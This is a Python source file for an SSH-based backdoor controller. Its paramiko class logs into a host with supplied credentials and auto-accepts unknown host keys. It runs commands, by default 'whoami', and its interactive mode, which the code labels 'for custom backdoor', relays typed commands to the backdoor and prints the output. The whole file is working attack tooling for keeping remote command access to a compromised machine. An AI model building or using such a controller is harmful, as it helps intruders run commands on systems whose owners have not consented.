import logging
import paramiko


logging.getLogger("paramiko").setLevel(logging.WARNING) 
logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] [%(levelname)s] - %(message)s'
)


class SSHBackdoorHandler:
    def __init__(self, ip: str, port: int, username: str, passwd: str) -> None:
        # check if args are of valid type
        assert isinstance(ip, str)
        assert isinstance(port, int)
        assert isinstance(username, str)
        assert isinstance(passwd, str)

        # create client
        self._client = paramiko.SSHClient()
        self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # connect to the client
        self._client.connect(
            hostname=ip,
            port=port,
            username=username,
            password=passwd,
        )

    def __del__(self):
        self._client.close()

    def exec_command(self, cmd: str = None):
        '''executes commands on ssh server and returns result'''
        if not cmd:
            cmd = 'whoami'

        # execute command and return output as string
        output = ''
        stdin, stdout, stderr = self._client.exec_command(command=cmd)
        output_list = stdout.readlines() + stderr.readlines()
        if output_list:
            output = '\n'.join([str(line).strip() for line in output_list])

        return output

    def interactive_mode(self):
        '''for custom backdoor'''
        # create ssh session
        session = self._client.get_transport().open_session()
        logging.info(f'Session Created')

        # receive first message
        print(session.recv(1024).decode("utf-8"))
        
        bad_chars_list = ['', '\r', '\r\n']
        while session.active:
            cmd = input(f'>> ').strip()

            # avoid executing error generating characters
            if cmd in bad_chars_list:
                continue

            # create exit command to exit the interactive mode
            if cmd == '!!exit':
                session.send('!!exit')
                break
            
            session.send(cmd.encode('utf-8')) # encode command and send to backdoor
            output = session.recv(1024).decode()
            print(output)
            
        logging.info('Session Closed')
